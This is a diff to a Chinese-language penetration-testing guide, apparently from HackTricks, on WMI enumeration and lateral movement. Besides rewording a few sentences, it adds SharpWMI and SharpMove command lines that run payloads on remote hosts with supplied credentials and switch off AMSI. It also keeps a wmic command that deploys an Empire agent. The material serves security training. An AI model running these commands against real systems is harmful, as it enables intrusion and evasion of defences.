@@ -12,7 +12,7 @@
 
 ### 命名空间
 
-WMI 的顶级容器是 \root，按照目录式层次结构组织，下面有称为命名空间 的其他目录。
+WMI 的顶级容器是 \root，结构呈目录式层次，下面组织着称为命名空间 的其他目录。
 列出命名空间的命令：
 ```bash
 # Retrieval of Root namespaces
@@ -89,7 +89,7 @@ wmic sysaccount list /format:list
 
 ### **手动远程 WMI 查询**
 
-可以通过特定的 WMI 查询隐秘地识别远程机器上的本地管理员和登录用户。`wmic` 还支持从文本文件读取，以便同时在多个节点上执行命令。
+可以通过特定的 WMI 查询隐秘地识别远程计算机上的本地管理员和登录用户。`wmic` 还支持从文本文件读取，以便同时在多个节点上执行命令。
 
 要通过 WMI 远程执行一个进程，例如部署 Empire 代理，使用以下命令结构，成功执行的返回值为 "0"：
 ```bash
@@ -97,14 +97,28 @@ wmic /node:hostname /user:user path win32_process call create "empire launcher s
 ```
 这个过程展示了WMI远程执行和系统枚举的能力，突显了它在系统管理和渗透测试中的实用性。
 
-## 参考文献
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
 ## 自动化工具
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- 你也可以使用 **Impacket's `wmiexec`**。
+
+## 参考
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
 {{#include ../../banners/hacktricks-training.md}}
